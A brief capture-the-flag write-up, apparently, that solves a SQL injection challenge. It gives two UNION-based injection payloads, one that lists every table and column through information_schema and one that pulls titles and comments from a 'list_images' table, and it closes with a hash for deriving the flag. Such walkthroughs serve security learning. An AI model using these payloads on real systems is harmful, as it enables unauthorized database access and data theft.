first use this to get all collumns of all tables:
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns

and look for "images" (Ctrl+F)

Then let's get comment and title from table "list_images"
1 AND 1=2 UNION SELECT title, comment FROM list_images

We can see one telling us to sha256 this md5 encoded string : 1928e8083cf461a51303633093573c46
This is our flag !